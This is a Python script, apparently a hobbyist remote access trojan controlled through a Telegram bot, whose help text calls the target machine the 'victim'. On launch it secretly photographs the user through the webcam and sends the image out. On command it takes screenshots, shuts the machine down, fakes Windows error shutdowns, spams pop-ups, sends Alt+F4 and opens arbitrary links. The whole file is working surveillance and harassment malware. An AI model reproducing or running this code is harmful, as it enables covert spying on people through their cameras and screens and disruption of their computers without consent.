import sys
import json
import ctypes
import telepot
import webbrowser
import pyautogui as pg
from time import sleep
from pprint import pprint
from os.path import exists
from random import randint
from threading import Thread
from datetime import datetime
from keyboard import press, release
from telepot.loop import MessageLoop
from os import system, remove, getenv
from cv2 import VideoCapture, imwrite, imshow, imread, resize, waitKey

TOKEN = ""
USERPROFILE = getenv("USERPROFILE")
OWNER = 0

help_ = """
Hi Peppino, theese are all the commands that you need.
Remember to follow me on github.com/Ricc4rdo0107, enjoy :D.

/stop : disconnect the bot.

/spegni : shuts down the machine

/spegnimsg <text> : shuts down the machine with a message.

/fakespegni : fake shutdown for 5 seconds.

/msg <message> : creates a window pop-up with a custom message.

/rickroll : open the stupid song.

/link <url> : open a link in the browser.

/selphie : sends you a picture from victim's webcam.

/screenshot : sends you a screenshot from victim's macine.

/ALTF4 : you can imagine.

*send a picture* : create an alert pop-up with the picture that you sent.
"""


bot = telepot.Bot(TOKEN)

def altf4():
    press('alt')
    press('f4')
    release('f4')
    release('alt')


def fake_shutdown():
    system('shutdown /s /t 34 /c "Windows Error 104e240-69, contattare l\'amministratore"')
    sleep(10)
    system("shutdown -a")
    

def selphie(OWNER, bot):
    try:
        filename = USERPROFILE+"/sl.jpg"

        camera = VideoCapture(0)
            
        return_value, image = camera.read()
            
        imwrite(filename, image)
            
        del(camera)
            
        bot.sendPhoto(OWNER, open(filename, "rb"))
            
        try:
            
            remove(filename)
        except Exception as e:
            bsend(f"È successo un macello\n {e}")
    except Exception as e:
        bsend(f"È successo un macello\n {e}")


def screenshot(OWNER, bot):
    try:
        filename = USERPROFILE+"/sl.jpg"

        screenshot = pg.screenshot()
        screenshot.save(filename)
        bot.sendPhoto(OWNER, open(filename, "rb"))
    
        try:
            remove(filename)
        except:
            bsend(f"È successo un macello\n {e}")
    except Exception as e:
        bsend(f"È successo un macello\n {e}")


def Mbox(title, text, style):
    return ctypes.windll.user32.MessageBoxW(0, text, title, style)


def spam_windows(n, text):
    for i in range(n):
        sp_win = Thread(target=Mbox, args=["Attenzione", text, 0,])
        sp_win.start()


def show(ImageAddress):
    try:
        imshow("Attenzione", resize(imread(ImageAddress), (400, 400)))
        waitKey(0)
    except Exception as e:
        print(e)


def bsend(msg):
    bot.sendMessage(OWNER, msg)

def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    
    if content_type == "text":
        text = msg['text']
        if chat_id == OWNER:
            if text == "/spegni":
                bsend("Spegnimento")
                system("shutdown -s -t 0")

            elif text == "/fakespegni":
                fk_shut = Thread(target=fake_shutdown)
                fk_shut.start()
    
            elif text.startswith("/spegnimsg"):
                txt = text.replace("/spegnimsg ", "")
                bsend("Spegnimento + Messaggio")
                system(f"shutdown -s -t 5 -c '{txt}'")
    
            elif text.startswith("/msg"):
                txt = text.replace("/msg ", "")
                msg_th = Thread(target=Mbox, args=["Attenzione", txt, 0,])
                msg_th.start()

            elif text.startswith("/spammsg"):
                arged = text.split()
                if len(arged) < 3:
                    bsend("Non hai inserito tutti gli argomenti (<messaggio> <numero di vignette>)")

                elif len(arged) > 3:
                    bsend("Hai scritto troppe cose, non riesco a capire un cazzo")

                else:
                    msg = arged[1]
                    windows = arged[2]

                    if windows.isdigit():
                        Thread(target=spam_windows, args=[int(windows), msg]).start()
                    else:
                        bsend("Il numero di vignette deve essere (stranamente) un NUMERO")

            elif text == "/ALTF4":
                Thread(target=altf4).start()

            elif text == "/stop":
                bsend("Ciao ciao ndundito!!")
                sys.exit()
    
            elif text == "/rickroll":
                webbrowser.open("https://www.youtube.com/watch?v=xvFZjo5PgG0")
    
            elif text.startswith("/link"):
                try:
                    webbrowser.open(text.replace("/link ", ""))
                except Exception as e:
                    bsend("Errore con l'apertura del link\nManda questo a riccardo")
                    bsend(e)
    
            elif text == "/selphie":
                selphie(OWNER, bot)
    
            elif text == "/screenshot":
                screenshot(OWNER, bot)
    
            elif text == "/help":
                bsend(help_)

            else:
                bsend("Non so che cazzo devo fare")

        else:
            bot.sendMessage(chat_id, "Svegliati freddo, ciccione coglione")

    elif content_type == "photo":
        bot.download_file(msg['photo'][-1]['file_id'], USERPROFILE+'/file.png')
        Thread(target=show, args=[USERPROFILE+'/file.png',]).start()
        try:
            remove("file.png")
        except:
            pass


current_time = datetime.now().strftime("%H:%M:%S")

try:
    selphie(OWNER, bot)
except Exception as e:
    bsend(f"Mannaggia cristo agg fatt na cacat\n{e}")

bsend(f"Bot avviato alle {current_time}, bentornato Peppino")

MessageLoop(bot, handle).run_as_thread()

while 1:
    sleep(0.5)
